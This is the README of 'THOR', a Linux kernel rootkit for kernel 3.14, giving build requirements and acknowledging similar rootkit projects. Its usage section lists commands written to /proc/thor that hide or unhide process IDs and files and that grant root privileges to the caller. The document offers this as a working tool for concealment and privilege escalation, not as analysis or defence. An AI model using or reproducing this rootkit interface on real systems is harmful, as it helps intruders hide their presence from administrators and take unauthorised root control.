# THOR

The Horrific Omnipotent Rootkit - or something like that, targeted at kernel
3.14 (archlinux LTS at the time of writing).

## Requirements

Apart from the linux kernel headers, the linux source code is required in order
to build this rootkit since unexported code is used.

Just make sure `/usr/src/linux` points to the linux source directory of the
target kernel. Or you could simply change the `Makefile`.

## How to Use

    usage:
       echo hp PID  > /proc/thor     (hides process PID)
       echo up PID  > /proc/thor     (unhides process PID)
       echo upa     > /proc/thor     (unhide all PIDs)
       echo hf FILE > /proc/thor     (hide file FILE)
       echo uf FILE > /proc/thor     (unhide file FILE)
       echo ufa     > /proc/thor     (unhide all files)
       echo root    > /proc/thor     (gain root privileges)

## Acknowledgement

- [Arkadiusz "ivyl" Hiler](https://github.com/ivyl/rootkit)
- [Morgan "mrrrgn" Phillips](https://github.com/mrrrgn/simple-rootkit)
- [uzyszkodnik](https://github.com/uzyszkodnik/rootkit)
